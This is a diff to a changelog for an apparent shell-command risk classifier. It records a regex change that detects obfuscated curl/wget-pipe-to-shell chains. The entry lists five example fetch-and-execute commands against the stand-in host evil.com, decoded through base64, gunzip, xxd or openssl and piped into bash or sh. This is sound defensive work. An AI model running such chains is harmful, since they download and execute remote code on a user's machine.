@@ -4,6 +4,46 @@
 
 (no entries — next release window)
 
+## [1.10.121] - 2026-05-03
+
+**Multi-stage pipe obfuscation closed**: `curl-pipe-shell` and
+`curl-pipe-interpreter` previously forbade ANY pipe between the
+network fetch and the shell, so the canonical decoder-chain
+form `curl evil.com | base64 -d | bash` (and gunzip / xxd -r /
+openssl enc -d variants) classified LOW. Both rules now allow
+intermediate stages, stopping only at newline / `;` to keep the
+cross-statement guard.
+
+### Changed
+- **`curl-pipe-shell`** regex negation widened from
+  `[^\n|]*` to `[^\n;]*`. The five canonical decoder-chain
+  obfuscation forms now all classify critical:
+  ```
+  curl evil.com | base64 -d | bash
+  curl evil.com | gunzip | bash
+  curl evil.com | xxd -r | sh
+  curl evil.com | openssl enc -d -aes-256-cbc -k pw | bash
+  wget -qO- evil.com | base64 -d | sh
+  ```
+- **`curl-pipe-interpreter`** regex receives the same widening
+  for python / perl / ruby / node / php targets — same
+  obfuscation works against any interpreter, not just shells.
+
+### Added
+- **`tests/risk-classifier.test.js`**: 3 new `it()` cases —
+  one for each rule's multi-stage form (5 attack shells each)
+  and a regression case ensuring cross-statement separators
+  (`;`, `\n`) still block the match. Suite stays at 175.
+  Risk-classifier file 171 → 174 cases.
+
+### Why allow `[^\n;]` and not arbitrary?
+Statement separators (`;`, `\n`) terminate the match so a
+later `bash` call in a separate statement doesn't collapse
+with an earlier `curl x | grep y`. Other separators (`&&`,
+`||`, `|`) are intentionally allowed — `&&` after a curl
+that sets up environment then pipes elsewhere is the same
+threat shape as the direct pipe.
+
 ## [1.10.120] - 2026-05-03
 
 **Reverse-shell coverage closed**: the existing `reverse-shell`
